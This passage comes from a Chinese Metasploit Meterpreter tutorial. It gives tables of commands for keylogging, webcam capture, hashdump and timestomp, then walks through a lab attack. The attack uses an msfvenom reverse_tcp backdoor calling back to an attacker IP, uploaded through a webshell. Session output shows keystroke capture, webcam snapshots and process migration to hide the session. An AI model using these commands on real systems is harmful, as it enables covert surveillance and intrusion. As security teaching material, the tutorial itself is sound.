    pgrep         通过名字<span class="token punctuation">(</span>特定字符串<span class="token punctuation">)</span>查询相关进程
    <span class="token function">pkill</span>         通过进程名关闭进程
    <span class="token function">ps</span>            查询列出当前运行的进程信息
    <span class="token function">reboot</span>        重启远程计算机
    reg           修改远程计算机注册表
    rev2self      Calls RevertToSelf<span class="token punctuation">(</span><span class="token punctuation">)</span> on the remote machine
    shell         进入目标系统交互式shell终端
    <span class="token function">shutdown</span>      将远程计算机关机
    steal_token   Attempts to steal an impersonation token from the target process
    <span class="token function">suspend</span>       Suspends or resumes a list of processes
    sysinfo       获取远程计算机系统详细信息<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="用户接口命令"><a href="#用户接口命令" class="headerlink" title="用户接口命令"></a>用户接口命令</h3><pre class="line-numbers language-bash"><code class="language-bash">Stdapi: User interface Commands
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>

    Command        Description
    -------        -----------
    enumdesktops   查看所有可用的桌面
    getdesktop     获取当前meterpreter关联的桌面
    idletime       Returns the number of seconds the remote user has been idle
    keyboard_send  Send keystrokes
    keyevent       Send key events
    keyscan_dump   导出键盘记录数据
    keyscan_start  开始键盘记录
    keyscan_stop   关闭键盘记录
    mouse          Send mouse events
    screenshare    查看远程用户桌面信息
    screenshot     捕获目标屏幕快照信息<span class="token punctuation">(</span>截屏<span class="token punctuation">)</span>
    setdesktop     设置meterpreter关联的桌面
    uictl          开启或禁止键盘/鼠标（uictl disable/enable keyboard/mouse/all）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="网络摄像头命令"><a href="#网络摄像头命令" class="headerlink" title="网络摄像头命令"></a>网络摄像头命令</h3><pre class="line-numbers language-bash"><code class="language-bash">Stdapi: Webcam Commands
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>

    Command        Description
    -------        -----------
    record_mic     Record audio from the default microphone <span class="token keyword">for</span> X seconds
    webcam_chat    开启视频聊天
    webcam_list    查看摄像头
    webcam_snap    通过摄像头拍照
    webcam_stream  通过摄像头开启视频<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="视频播放命令"><a href="#视频播放命令" class="headerlink" title="视频播放命令"></a>视频播放命令</h3><pre class="line-numbers language-bash"><code class="language-bash">Stdapi: Audio Output Commands
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>

    Command       Description
    -------       -----------
    play          从目标系统播放音频<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="提权命令"><a href="#提权命令" class="headerlink" title="提权命令"></a>提权命令</h3><pre class="line-numbers language-bash"><code class="language-bash">Priv: Elevate Commands
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>

    Command       Description
    -------       -----------
    getsystem     尝试去提权<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="密码捕获命令"><a href="#密码捕获命令" class="headerlink" title="密码捕获命令"></a>密码捕获命令</h3><pre class="line-numbers language-bash"><code class="language-bash">Priv: Password database Commands
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>

    Command       Description
    -------       -----------
    hashdump      查看SAM数据库信息<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="时间戳命令"><a href="#时间戳命令" class="headerlink" title="时间戳命令"></a>时间戳命令</h3><pre class="line-numbers language-bash"><code class="language-bash">Priv: Timestomp Commands
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>

    Command       Description
    -------       -----------
    timestomp     操纵文件MACE属性<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="命令解读-Linux"><a href="#命令解读-Linux" class="headerlink" title="命令解读-Linux"></a>命令解读-Linux</h2><p>Linux下的Meterpreter命令解读</p>
<h3 id="核心命令-1"><a href="#核心命令-1" class="headerlink" title="核心命令"></a>核心命令</h3><pre class="line-numbers language-bash"><code class="language-bash">Core Commands
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>

    Command                   Description
    -------                   -----------
    ?                         帮助手册
    background                将当前会话放置后台
    <span class="token function">bg</span>                        background命令的别名
    bgkill                    杀死meterpreter后台运行的脚本
    bglist                    列出meterpreter后台运行的脚本
    bgrun                     在后台运行一个meterpreter脚本
    channel                   Displays information or control active channels
    close                     Closes a channel
    disable_unicode_encoding  关闭Unicode字符串的编码
    enable_unicode_encoding   启用Unicode字符串的编码
    <span class="token keyword">exit</span>                      关闭退出 meterpreter session
    get_timeouts              查看当前会话超时信息
    guid                      查看会话GUID
    <span class="token function">help</span>                      帮助手册
    info                      展示post模块信息
    irb                       在当前会话中打开一个交互式的Ruby shell
    load                      加载一个或多个meterpreter扩展
    machine_id                Get the MSF ID of the machine attached to the session
    migrate                   进程迁移（将Meterpreter会话移植到指定pid值进程中）
    pry                       Open the Pry debugger on the current session
    quit                      关闭退出 meterpreter session
    <span class="token function">read</span>                      Reads data from a channel
    resource                  运行存储在文件中的命令（运行批处理文件）
    run                       执行一个 meterpreter 脚本 或 Post 模块
    secure                    <span class="token punctuation">(</span>Re<span class="token punctuation">)</span>Negotiate TLV packet encryption on the session
    sessions                  快速切换到另一个会话中（sessions -i ID）
    set_timeouts              设置当前会话超时信息
    <span class="token function">sleep</span>                     Force Meterpreter to go quiet, <span class="token keyword">then</span> re-establish session.
    transport                 Change the current transport mechanism
    use                       <span class="token string">"load"</span>的别名（已弃用）
    uuid                      获取当前会话的uuid信息
    <span class="token function">write</span>                     Writes data to a channel<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="文件系统命令-1"><a href="#文件系统命令-1" class="headerlink" title="文件系统命令"></a>文件系统命令</h3><pre class="line-numbers language-bash"><code class="language-bash">Stdapi: File system Commands
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>

    Command       Description
    -------       -----------
    <span class="token function">cat</span>           读取会话系统中某一个文件的内容并显示
    <span class="token function">cd</span>            改变当前目录
    checksum      检索文件的校验和
    <span class="token function">cp</span>            文件复制操作
    <span class="token function">dir</span>           列出当前目录下的文件 <span class="token punctuation">(</span>ls的别名<span class="token punctuation">)</span>
    download      从当前目录下载某一个文件
    edit          编辑文件
    getlwd        打印本地当前工作目录
    getwd         打印工作目录
    lcd           改变本地工作目录
    lls           列出本地目录下的文件
    lpwd          打印本地当前工作目录
    <span class="token function">ls</span>            列出目录下所有文件
    <span class="token function">mkdir</span>         创建文件夹
    <span class="token function">mv</span>            移动文件
    <span class="token function">pwd</span>           打印当前工作目录
    <span class="token function">rm</span>            删除某个特殊文件
    <span class="token function">rmdir</span>         删除某个目录
    search        搜索文件
    upload        上传文件或一个目录<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="网络命令-1"><a href="#网络命令-1" class="headerlink" title="网络命令"></a>网络命令</h3><pre class="line-numbers language-bash"><code class="language-bash">Stdapi: Networking Commands
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>

    Command       Description
    -------       -----------
    portfwd       端口转发<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="系统命令-1"><a href="#系统命令-1" class="headerlink" title="系统命令"></a>系统命令</h3><pre class="line-numbers language-bash"><code class="language-bash">Stdapi: System Commands
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>

    Command       Description
    -------       -----------
    execute       执行一个命令
    getenv        获取一个或多个换几个环境变量
    getpid        获取当前会话进程ID<span class="token punctuation">(</span>pid<span class="token punctuation">)</span>
    getuid        查看权限
    <span class="token function">kill</span>          杀死进程（kill <span class="token operator">&lt;</span>pid<span class="token operator">></span>）
    localtime     获取目标系统当前日期和时间
    pgrep         通过名字<span class="token punctuation">(</span>特定字符串<span class="token punctuation">)</span>查询相关进程
    <span class="token function">pkill</span>         通过进程名关闭进程
    <span class="token function">ps</span>            查询列出当前运行的进程信息
    shell         进入目标系统交互式shell终端
    sysinfo       获取远程计算机系统详细信息<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="视频播放命令-1"><a href="#视频播放命令-1" class="headerlink" title="视频播放命令"></a>视频播放命令</h3><pre class="line-numbers language-bash"><code class="language-bash">Stdapi: Audio Output Commands
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>

    Command       Description
    -------       -----------
    play          从目标系统播放音频<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="实战攻略"><a href="#实战攻略" class="headerlink" title="实战攻略"></a>实战攻略</h2><h3 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h3><p>以得到Windows下的Meterpreter来演示相关实战操作（拿下一台www服务器，反弹一个meterpreter终端）</p>
<ul>
<li>网络拓扑</li>
</ul>
<p><img src="/2020/06/20/metasploit-framework/image-20200621151944463.png" alt="image-20200621151944463"></p>
<p>网络分布主要分为外网和内网两大部分，在边界路由器中外网IP段为：<code>192.33.6.0/24</code>、内网IP网段为：<code>192.168.9.0/24</code></p>
<ul>
<li>msfvenom制作后门反弹shell</li>
</ul>
<pre><code>msfvenom -p windows/meterpreter/reverse_tcp lhost=192.33.6.150 lport=3333 -f exe -o msf.exe</code></pre><ul>
<li>实战利用：已得到www服务器后门webshell，上传msf.exe，执行反弹后门shell</li>
</ul>
<p><img src="/2020/06/20/metasploit-framework/image-20200701134000487.png" alt="image-20200701134000487"></p>
<h3 id="基本系统操作指令"><a href="#基本系统操作指令" class="headerlink" title="基本系统操作指令"></a>基本系统操作指令</h3><ul>
<li>指令指南</li>
</ul>
<pre class="line-numbers language-bash"><code class="language-bash">    Command                   Description
    -------                   -----------
    background                将当前会话放置后台
    <span class="token function">bg</span>                        background命令的别名
    exit/quit                 关闭退出 meterpreter session
    info                      展示post模块信息
    load                      加载一个或多个meterpreter扩展
    run                       执行一个 meterpreter 脚本 或 Post 模块
    sessions                  快速切换到另一个会话中（sessions -i ID）
    use                       <span class="token string">"load"</span>的别名（已弃用）
    getuid                      查看权限
    <span class="token function">kill</span>                        杀死进程（kill <span class="token operator">&lt;</span>pid<span class="token operator">></span>）
    pgrep                      通过名字<span class="token punctuation">(</span>特定字符串<span class="token punctuation">)</span>查询相关进程
    <span class="token function">pkill</span>                      通过进程名关闭进程
    <span class="token function">ps</span>                        查询列出当前运行的进程信息
    <span class="token function">reboot</span>                    重启远程计算机
    shell                     进入目标系统交互式shell终端
    <span class="token function">shutdown</span>                    将远程计算机关机
    sysinfo                    获取远程计算机系统详细信息<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="键盘-amp-鼠标操作"><a href="#键盘-amp-鼠标操作" class="headerlink" title="键盘&amp;鼠标操作"></a>键盘&amp;鼠标操作</h3><ul>
<li>指令指南</li>
</ul>
<pre class="line-numbers language-bash"><code class="language-bash">uictl <span class="token punctuation">[</span>enable/disable<span class="token punctuation">]</span> <span class="token punctuation">[</span>keyboard/mouse/all<span class="token punctuation">]</span>  <span class="token comment" spellcheck="true">#开启或禁止键盘/鼠标</span>
uictl disable mouse  <span class="token comment" spellcheck="true">#禁用鼠标</span>
uictl disable keyboard  <span class="token comment" spellcheck="true">#禁用键盘</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<ul>
<li>实战</li>
</ul>
<pre class="line-numbers language-bash"><code class="language-bash">meterpreter <span class="token operator">></span> uictl -h
Usage: uictl <span class="token punctuation">[</span>enable/disable<span class="token punctuation">]</span> <span class="token punctuation">[</span>keyboard/mouse/all<span class="token punctuation">]</span>
meterpreter <span class="token operator">></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<h3 id="键盘记录"><a href="#键盘记录" class="headerlink" title="键盘记录"></a>键盘记录</h3><ul>
<li>指令指南</li>
</ul>
<pre class="line-numbers language-bash"><code class="language-bash">keyscan_start  <span class="token comment" spellcheck="true">#开始键盘记录</span>
keyscan_dump   <span class="token comment" spellcheck="true">#导出记录数据</span>
keyscan_stop  <span class="token comment" spellcheck="true">#结束键盘记录</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<ul>
<li>实战：监控目标机键盘记录</li>
</ul>
<p>注意：这里需要监控什么账户的键盘记录就需要将会话进程切换到什么账户权限中，这里原本权限是<code>system</code>为了监控root用户键盘记录，所以进行进程的迁移</p>
<pre class="line-numbers language-bash"><code class="language-bash">meterpreter <span class="token operator">></span> getuid 
Server username: NT AUTHORITY\SYSTEM
meterpreter <span class="token operator">></span> migrate 2308
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Migrating from 2904 to 2308<span class="token punctuation">..</span>.
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Migration completed successfully.
meterpreter <span class="token operator">></span> getuid 
Server username: WIN-5DTIE0M734E\root
meterpreter <span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>开始监控</p>
<pre class="line-numbers language-bash"><code class="language-bash">meterpreter <span class="token operator">></span> keyscan_start 
Starting the keystroke sniffer <span class="token punctuation">..</span>.
meterpreter <span class="token operator">></span> keyscan_dump 
Dumping captured keystrokes<span class="token punctuation">..</span>.
woaini<span class="token operator">&lt;</span>CR<span class="token operator">></span>


meterpreter <span class="token operator">></span>
meterpreter <span class="token operator">></span> keyscan_stop 
Stopping the keystroke sniffer<span class="token punctuation">..</span>.
meterpreter <span class="token operator">></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="摄像头操作"><a href="#摄像头操作" class="headerlink" title="摄像头操作"></a>摄像头操作</h3><ul>
<li>指令指南</li>
</ul>
<pre class="line-numbers language-bash"><code class="language-bash">webcam_list     <span class="token comment" spellcheck="true">#查看摄像头</span>
webcam_snap     <span class="token comment" spellcheck="true">#通过摄像头拍照</span>
webcam_stream   <span class="token comment" spellcheck="true">#通过摄像头开启视频监控(以网页形式进行监控==直播）</span>
webcam_chat     <span class="token comment" spellcheck="true">#通过摄像头开启视频聊天（对方有弹窗）</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<ul>
<li>实战：通过摄像头拍照</li>
</ul>
<pre class="line-numbers language-bash"><code class="language-bash">meterpreter <span class="token operator">></span> webcam_list 
1: EasyCamera
meterpreter <span class="token operator">></span>
meterpreter <span class="token operator">></span> webcam_snap 
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Starting<span class="token punctuation">..</span>.
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Got frame
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Stopped
Webcam shot saved to: /home/qftm/Desktop/RLBlgNRf.jpeg
meterpreter <span class="token operator">></span>
meterpreter <span class="token operator">></span> lls /home/qftm/Desktop/
Listing Local: /home/qftm/Desktop/
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>

Mode              Size   Type  Last modified              Name
----              ----   ----  -------------              ----
40777/rwxrwxrwx   4096   <span class="token function">dir</span>   2020-05-03 22:04:11 -0400  ProgrammingProjects
40777/rwxrwxrwx   4096   <span class="token function">dir</span>   2020-06-16 11:23:45 -0400  QSec
100644/rw-r--r--  35533  fil   2020-06-25 02:12:46 -0400  RLBlgNRf.jpeg
100644/rw-r--r--  21     fil   2020-06-24 23:56:29 -0400  hacking.txt

meterpreter <span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<ul>
<li>实战：通过摄像头开启视频监控</li>
</ul>
<pre class="line-numbers language-bash"><code class="language-bash">meterpreter <span class="token operator">></span> webcam_stream 
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Starting<span class="token punctuation">..</span>.
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Preparing player<span class="token punctuation">..</span>.
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Opening player at: /home/qftm/Desktop/jhQokqrO.html
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Streaming<span class="token punctuation">..</span>.
Opening <span class="token keyword">in</span> existing browser session.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="/2020/06/20/metasploit-framework/image-20200625141843103.png" alt="image-20200625141843103"></p>
<h3 id="进程操作"><a href="#进程操作" class="headerlink" title="进程操作"></a>进程操作</h3><ul>
<li>查看目标机进程信息</li>
</ul>
<pre class="line-numbers language-bash"><code class="language-bash">meterpreter <span class="token operator">></span> <span class="token function">ps</span>

Process List
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>

 PID   PPID  Name               Arch  Session  User                          Path
 ---   ----  ----               ----  -------  ----                          ----
 0     0     <span class="token punctuation">[</span>System Process<span class="token punctuation">]</span>                                                
 4     0     System             x64   0                                      
 100   484   svchost.exe        x64   0        NT AUTHORITY\LOCAL SERVICE    
 244   4     smss.exe           x64   0        NT AUTHORITY\SYSTEM           \SystemRoot\System32\smss.exe
 332   320   csrss.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe
 384   320   wininit.exe        x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\wininit.exe
 392   376   csrss.exe          x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe
 428   376   winlogon.exe       x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\winlogon.exe
 484   384   services.exe       x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\services.exe
 500   384   lsass.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\lsass.exe
 508   384   lsm.exe            x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\lsm.exe
 604   484   svchost.exe        x64   0        NT AUTHORITY\SYSTEM           
 664   484   svchost.exe        x64   0        NT AUTHORITY\NETWORK SERVICE  
 680   484   svchost.exe        x64   0        NT AUTHORITY\NETWORK SERVICE  
 756   484   svchost.exe        x64   0        NT AUTHORITY\LOCAL SERVICE    
 764   484   svchost.exe        x64   0        NT AUTHORITY\LOCAL SERVICE    
 832   484   svchost.exe        x64   0        NT AUTHORITY\SYSTEM           
 876   484   svchost.exe        x64   0        NT AUTHORITY\SYSTEM           
 1112  484   spoolsv.exe        x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe
 1140  484   svchost.exe        x64   0        NT AUTHORITY\LOCAL SERVICE    
 1268  604   WmiPrvSE.exe                                                    
 1288  484   VGAuthService.exe  x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe
 1364  484   vmtoolsd.exe       x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\VMware\VMware Tools\vmtoolsd.exe
 1380  484   svchost.exe        x64   0        NT AUTHORITY\SYSTEM           
 1504  484   VSSVC.exe          x64   0        NT AUTHORITY\SYSTEM           
 1592  484   svchost.exe        x64   0        NT AUTHORITY\NETWORK SERVICE  
 1812  484   dllhost.exe        x64   0        NT AUTHORITY\SYSTEM           
 1900  484   msdtc.exe          x64   0        NT AUTHORITY\NETWORK SERVICE  
 2164  484   svchost.exe        x64   0        NT AUTHORITY\SYSTEM           
 2204  484   taskhost.exe       x64   1        WIN-5DTIE0M734E\root          C:\Windows\system32\taskhost.exe
 2276  832   dwm.exe            x64   1        WIN-5DTIE0M734E\root          C:\Windows\system32\Dwm.exe
 2308  2268  explorer.exe       x64   1        WIN-5DTIE0M734E\root          C:\Windows\Explorer.EXE
 2436  2308  vm3dservice.exe    x64   1        WIN-5DTIE0M734E\root          C:\Windows\System32\vm3dservice.exe
 2444  2308  vmtoolsd.exe       x64   1        WIN-5DTIE0M734E\root          C:\Program Files\VMware\VMware Tools\vmtoolsd.exe
 2640  484   SearchIndexer.exe  x64   0        NT AUTHORITY\SYSTEM           

meterpreter <span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="进程迁移"><a href="#进程迁移" class="headerlink" title="进程迁移"></a>进程迁移</h3><ul>
<li>指令指南</li>
</ul>
<pre class="line-numbers language-bash"><code class="language-bash">getpid                <span class="token comment" spellcheck="true"># 获取当前进程的pid</span>
<span class="token function">ps</span>                   <span class="token comment" spellcheck="true"># 查看当前活跃进程</span>
migrate <span class="token operator">&lt;</span>pid值<span class="token operator">></span>     <span class="token comment" spellcheck="true">#将Meterpreter会话移植到指定pid值进程中</span>
<span class="token function">kill</span> <span class="token operator">&lt;</span>pid值<span class="token operator">></span>         <span class="token comment" spellcheck="true">#杀死进程</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<ul>
<li>实战：迁移meterpreter会话进程到其他进程中，实现恶意会话进程的隐藏</li>
</ul>
<p>获取当前进程ID</p>
<pre class="line-numbers language-bash"><code class="language-bash">meterpreter <span class="token operator">></span> getpid 
Current pid: 1112
meterpreter <span class="token operator">></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>查看目标机进程信息</p>
<pre class="line-numbers language-bash"><code class="language-bash">meterpreter <span class="token operator">></span> <span class="token function">ps</span>

Process List
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>

 PID   PPID  Name               Arch  Session  User                          Path
 ---   ----  ----               ----  -------  ----                          ----
 0     0     <span class="token punctuation">[</span>System Process<span class="token punctuation">]</span>                                                
 4     0     System             x64   0                                      
 100   484   svchost.exe        x64   0        NT AUTHORITY\LOCAL SERVICE    
 244   4     smss.exe           x64   0        NT AUTHORITY\SYSTEM           \SystemRoot\System32\smss.exe
 332   320   csrss.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe
 384   320   wininit.exe        x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\wininit.exe
 392   376   csrss.exe          x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe
 428   376   winlogon.exe       x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\winlogon.exe
 484   384   services.exe       x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\services.exe
 500   384   lsass.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\lsass.exe
 508   384   lsm.exe            x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\lsm.exe
 604   484   svchost.exe        x64   0        NT AUTHORITY\SYSTEM           
 664   484   svchost.exe        x64   0        NT AUTHORITY\NETWORK SERVICE  
 680   484   svchost.exe        x64   0        NT AUTHORITY\NETWORK SERVICE  
 756   484   svchost.exe        x64   0        NT AUTHORITY\LOCAL SERVICE    
 764   484   svchost.exe        x64   0        NT AUTHORITY\LOCAL SERVICE    
 832   484   svchost.exe        x64   0        NT AUTHORITY\SYSTEM           
 876   484   svchost.exe        x64   0        NT AUTHORITY\SYSTEM           
 1112  484   spoolsv.exe        x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe
 1140  484   svchost.exe        x64   0        NT AUTHORITY\LOCAL SERVICE    
 1268  604   WmiPrvSE.exe                                                    
 1288  484   VGAuthService.exe  x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe
 1364  484   vmtoolsd.exe       x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\VMware\VMware Tools\vmtoolsd.exe
 1592  484   svchost.exe        x64   0        NT AUTHORITY\NETWORK SERVICE  
 1812  484   dllhost.exe        x64   0        NT AUTHORITY\SYSTEM           
 1900  484   msdtc.exe          x64   0        NT AUTHORITY\NETWORK SERVICE  
 2164  484   svchost.exe        x64   0        NT AUTHORITY\SYSTEM           
 2204  484   taskhost.exe       x64   1        WIN-5DTIE0M734E\root          C:\Windows\system32\taskhost.exe
 2276  832   dwm.exe            x64   1        WIN-5DTIE0M734E\root          C:\Windows\system32\Dwm.exe
 2308  2268  explorer.exe       x64   1        WIN-5DTIE0M734E\root          C:\Windows\Explorer.EXE
 2436  2308  vm3dservice.exe    x64   1        WIN-5DTIE0M734E\root          C:\Windows\System32\vm3dservice.exe
 2444  2308  vmtoolsd.exe       x64   1        WIN-5DTIE0M734E\root          C:\Program Files\VMware\VMware Tools\vmtoolsd.exe
 2640  484   SearchIndexer.exe  x64   0        NT AUTHORITY\SYSTEM           

meterpreter <span class="token operator">></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>选择目标主机活跃进程隐藏会话进程，注入进程：将pid-1112迁移注入到pid-2308的explorer.exe进程中</p>
